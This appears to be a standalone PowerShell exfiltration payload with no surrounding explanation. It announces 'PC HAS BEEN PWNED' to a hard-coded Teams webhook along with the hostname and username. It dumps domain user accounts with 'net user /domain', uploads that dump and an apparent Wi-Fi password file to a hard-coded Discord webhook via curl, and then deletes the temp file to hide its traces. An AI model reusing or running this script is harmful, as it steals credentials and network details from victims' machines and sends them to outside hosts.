$url = "https://vandenbroele1.webhook.office.com/webhookb2/e344f866-fa7f-4974-8971-edfd378b7414@67d5bf39-1ef9-4dd5-8feb-4bd7f2fabb7f/IncomingWebhook/2f862ccffa6c4bacafc922d6267dd131/b77fe17d-d339-4c1e-8e2e-28762e9341a4"
$statsContent = "PC HAS BEEN PWNED`n`n`n`nPC Name: $(hostname)`n`nUsername: $env:USERNAME"
$Body = @{ "type"= "TextBlock"; "text" = $statsContent }| ConvertTo-Json
Invoke-RestMethod -ContentType 'Application/Json' -Uri $url -Method Post -Body $Body


$statsFile = "$env:TEMP/--temp.txt"
net user /domain > $statsFile 
$dc ="https://discord.com/api/webhooks/1214217933702565979/DdrVEpjn1YBz5ve_a6aCMRt18_iAdnK4e-es716tVajhUODcZPgHp7mtGHeRaTKtrrIi"


function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "https://discord.com/api/webhooks/1214217933702565979/DdrVEpjn1YBz5ve_a6aCMRt18_iAdnK4e-es716tVajhUODcZPgHp7mtGHeRaTKtrrIi"

$Body = @{
  'username' = $env:username
  'content' = $text
}
if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}


Upload-Discord -file "$env:TEMP/--temp.txt" -text $statsContent

Remove-Item -Path "$env:TEMP/--temp.txt" -Force